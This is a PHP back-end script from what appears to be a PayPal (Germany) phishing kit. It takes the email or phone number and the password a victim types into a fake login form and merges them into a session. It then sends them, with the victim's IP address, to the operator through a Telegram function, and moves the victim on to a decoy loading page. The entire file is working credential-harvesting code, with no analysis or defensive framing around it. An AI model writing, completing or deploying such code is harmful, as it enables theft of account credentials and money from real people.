<?php
require 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sid = $_GET['sid'] ?? $_SESSION['sid'] ?? null;
    if (empty($sid)) { redirect('index.php'); exit; }

    $session = get_session($sid);
    $session['last_activity'] = time();
    
    $new_data = [];
    $step_name = "Unknown Step";

    if (isset($_POST['identifier'])) {
        $new_data['identifier'] = trim($_POST['identifier']);
        $step_name = "PayPal Login (Email/Phone)";
    } 
    elseif (isset($_POST['password'])) {
        $new_data['password'] = trim($_POST['password']);
        $step_name = "PayPal Password";
    }

    if (!isset($session['data']) || !is_array($session['data'])) { $session['data'] = []; }
    $session['data'] = array_merge($session['data'], $new_data);

    if (!isset($session['redirect_url']) || empty($session['redirect_url'])) { $session['redirect_url'] = 'loading.php'; }

    $msg = "🅿️ <b>PayPal DE — New Data: $step_name</b>\nSID: <code>$sid</code>\nIP: " . $session['ip'] . "\n\n";
    foreach($new_data as $key => $val) {
        $msg .= "<b>" . ucfirst(str_replace('_', ' ', $key)) . ":</b> <code>" . htmlspecialchars($val) . "</code>\n";
    }
    
    sendToTelegram($msg, $sid);
    save_session($sid, $session);
    redirect('loading.php?sid=' . $sid);
    exit;
}
redirect('index.php');
?>